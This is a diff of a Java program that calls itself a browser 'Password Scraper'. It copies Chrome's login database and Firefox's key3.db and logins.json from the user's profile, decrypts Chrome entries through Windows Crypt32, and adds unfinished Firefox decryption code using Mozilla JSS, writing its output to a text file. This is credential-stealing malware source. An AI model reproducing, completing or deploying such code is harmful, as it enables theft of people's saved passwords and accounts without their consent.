@@ -1,27 +1,52 @@
+// Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
 import java.util.*;
+import java.util.Base64;
+import java.util.Base64.Decoder;
 
+import javax.crypto.Cipher;
+
+// Apache Libs
 import org.apache.commons.io.FileUtils;
 
+// WIN32 Native Functions
 import com.sun.jna.platform.win32.*;
 
+// Standard Java IO
 import java.io.File;
-
 import java.io.IOException;
 import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.PrintStream;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.security.GeneralSecurityException;
+import java.security.KeyStore;
+// SQLite libraries
 import java.sql.DriverManager;
 import java.sql.Connection;
 import java.sql.ResultSet;
 import java.sql.SQLException;
 import java.sql.Statement;
 
+// Libraries for Handling JSON
 import org.json.JSONArray;
 import org.json.JSONObject;
 import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
 
-// Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
+// Mozilla Security Suite for Java
+import org.mozilla.jss.*;
+import org.mozilla.jss.CryptoManager.NotInitializedException;
+import org.mozilla.jss.crypto.AlreadyInitializedException;
+import org.mozilla.jss.crypto.CryptoToken;
+import org.mozilla.jss.crypto.SecretDecoderRing;
+import org.mozilla.jss.crypto.SymmetricKey;
+import org.mozilla.jss.crypto.TokenException;
+import org.mozilla.jss.pkcs11.KeyType;
+
+// Sun InfoSec Libs
+import sun.security.pkcs11.*;
 
 public class jdec extends Crypt32Util {
 	
@@ -41,7 +66,6 @@ public class jdec extends Crypt32Util {
 		String url = "jdbc:sqlite:logindata.db";
 		conn = DriverManager.getConnection(url);
 
-	
 		// SQL Queries
 		Statement stmt1 = conn.createStatement();
 		Statement stmt2 = conn.createStatement();
@@ -86,7 +110,6 @@ public class jdec extends Crypt32Util {
 		pint++;
 		}
 	
-	
 		ArrayList<byte[]> unencrypted = new ArrayList<byte[]>();
 		int x = 0;
 	
@@ -108,7 +131,7 @@ public class jdec extends Crypt32Util {
 		}
 	}
 	
-	public static void FirefoxDec() throws IOException, ParseException {
+	public static void FirefoxDec() throws IOException, ParseException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, GeneralSecurityException, TokenException, NotInitializedException {
 		
 		// Get username
 		String user = System.getProperty("user.name");
@@ -127,8 +150,8 @@ public class jdec extends Crypt32Util {
 	
 		// Get Key File
 		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/key3.db");
-		File firefoxdest = FileUtils.getFile("key3.db");
-		FileUtils.copyFile(firefox, firefoxdest);
+		File firefoxkeydest = FileUtils.getFile("key3.db");
+		FileUtils.copyFile(firefox, firefoxkeydest);
 		
 		// Get JSON file, hashes in plaintext
 		File firefoxjson = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/logins.json");
@@ -143,9 +166,15 @@ public class jdec extends Crypt32Util {
 		JSONArray logins = ffobj.getJSONArray("logins");
 		
 		// Put into arrays
+		
+		// URLS
 		ArrayList<String> ffurls = new ArrayList<String>();
+		// Encrypted Usernames + Passwords
 		ArrayList<String> ffencryptedusernames = new ArrayList<String>();
 		ArrayList<String> ffencryptedpasswords = new ArrayList<String>();
+		// Decrypted Usernames + Passwords
+		ArrayList<String> ffdecryptedusernames = new ArrayList<String>();
+		ArrayList<String> ffdecryptedpasswords = new ArrayList<String>();
 		
 		// Get websites
 		for(int j = 0; j < logins.length(); j++){
@@ -162,11 +191,39 @@ public class jdec extends Crypt32Util {
 			ffencryptedpasswords.add(logins.getJSONObject(j).getString("encryptedPassword"));
 		}
 		
-		// -- Need to import JSS jar and use SunPKCS11 to decrypt username/passwords with key3.db and function
+		// Firefox uses Public-Key Cryptography Standards#11 (PKCS#11)
+		// There's a NSS library that originates from Netscape when the
+		// SSL security protocol was invented.
+		// Mozilla created a interface called JSS that allows developers
+		// to interact with this library.
+		
+		CryptoManager.initialize("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "/key3.db");
+		
+		// Parse key3.db to decode DES3 encrypted usernames and passwords with JSS
+		Path keypath = Paths.get("key3.db");
+		byte[] key = Files.readAllBytes(keypath);
+		
+		// Need to create a token using the key3.db and pass it to the KeyManager
+		// Then Decrypt using key3.db and Base64?
+		
+		// Turns out I need to build JSS with C++ libs, ughhhhhhhhhhhhhhhh MOZILLAAAAA
+		
+		// Declare Base64 Decoder
+		Base64.Decoder dec = Base64.getDecoder();
+		
+		System.out.println("Firefox usernames and passwords: ");
+		
+		for(String username : ffencryptedusernames){
+
+		}
+		
+		for(String password : ffencryptedpasswords){
+			//ffdecryptedpasswords.add(Base64.decodeBase64(password).toString());
+		}
 		
 	}
 	
-	public static void main(String[] args) throws SQLException, IOException, ParseException {
+	public static void main(String[] args) throws SQLException, IOException, ParseException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, GeneralSecurityException, TokenException, NotInitializedException {
 		
 		// Redirect output to text file
 		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
